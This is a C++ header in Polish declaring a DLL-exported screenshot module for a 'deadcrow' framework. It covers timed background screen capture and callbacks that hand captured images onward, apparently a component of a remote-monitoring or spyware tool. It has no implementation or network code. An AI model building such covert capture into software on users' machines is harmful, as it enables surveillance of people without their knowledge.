#pragma once

#include <string>
#include <vector>
#include <functional>
#include <windows.h>

namespace deadcrow {
namespace modules {

class Screenshot {
public:
    // Konstruktor
    Screenshot();
    
    // Destruktor
    ~Screenshot();
    
    // Wykonanie zrzutu ekranu i zapisanie do pliku
    bool captureToFile(const std::string& file_path);
    
    // Wykonanie zrzutu ekranu i zwrócenie jako wektor bajtów (format PNG)
    std::vector<uint8_t> captureToMemory();
    
    // Rozpoczęcie automatycznego wykonywania zrzutów ekranu
    bool startAutoCapture(const std::string& directory, int interval_seconds = 60);
    
    // Zatrzymanie automatycznego wykonywania zrzutów ekranu
    void stopAutoCapture();
    
    // Ustawienie callbacka do raportowania statusu
    void setStatusCallback(std::function<void(const std::string&)> callback);
    
    // Ustawienie callbacka do obsługi zrzutów ekranu
    void setCaptureCallback(std::function<void(const std::vector<uint8_t>&)> callback);
    
    // Sprawdzenie, czy automatyczne wykonywanie zrzutów ekranu jest aktywne
    bool isAutoCapturing() const;
    
    // Funkcja eksportowana dla DLL
    static BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
    
private:
    // Flaga aktywności automatycznego wykonywania zrzutów ekranu
    bool auto_capturing_;
    
    // Wątek automatycznego wykonywania zrzutów ekranu
    HANDLE capture_thread_;
    
    // Flaga zatrzymania wątku
    bool stop_thread_;
    
    // Callback do raportowania statusu
    std::function<void(const std::string&)> status_callback_;
    
    // Callback do obsługi zrzutów ekranu
    std::function<void(const std::vector<uint8_t>&)> capture_callback_;
    
    // Raportowanie statusu
    void reportStatus(const std::string& status);
    
    // Funkcja wątku automatycznego wykonywania zrzutów ekranu
    static DWORD WINAPI captureThreadProc(LPVOID param);
    
    // Wykonanie zrzutu ekranu do bitmapy
    HBITMAP captureScreen();
    
    // Konwersja bitmapy do formatu PNG
    std::vector<uint8_t> bitmapToPng(HBITMAP bitmap);
    
    // Zapisanie bitmapy do pliku
    bool saveBitmapToFile(HBITMAP bitmap, const std::string& file_path);
};

// Funkcje eksportowane dla DLL
extern "C" __declspec(dllexport) bool CaptureScreenshot(const char* file_path);
extern "C" __declspec(dllexport) bool StartAutoCapture(const char* directory, int interval_seconds);
extern "C" __declspec(dllexport) void StopAutoCapture();

} // namespace modules
} // namespace deadcrow
